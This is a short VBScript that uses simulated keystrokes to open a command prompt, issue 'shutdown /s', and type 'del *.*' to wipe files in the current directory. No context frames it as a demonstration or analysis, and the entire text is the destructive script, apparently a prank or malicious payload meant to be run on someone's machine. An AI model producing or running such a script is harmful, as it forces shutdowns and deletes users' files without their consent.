set x=createobject("wscript.shell")

x.sendkeys "^"+"{ESC}"
wscript.sleep 1000
x.sendkeys "command prompt"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 500
x.sendkeys "shutdown /s"
wscript.sleep 500
x.sendkeys "{ENTER}"
wscript.sleep 1000
x.sendkeys "{ENTER}" 
wscript.sleep 500
x.sendkeys "del *.*"
wscript.sleep 500
x.sendkeys "{ENTER}"
x.sendkeys "exit"
wscript.sleep 500
x.sendkeys "{ENTER}"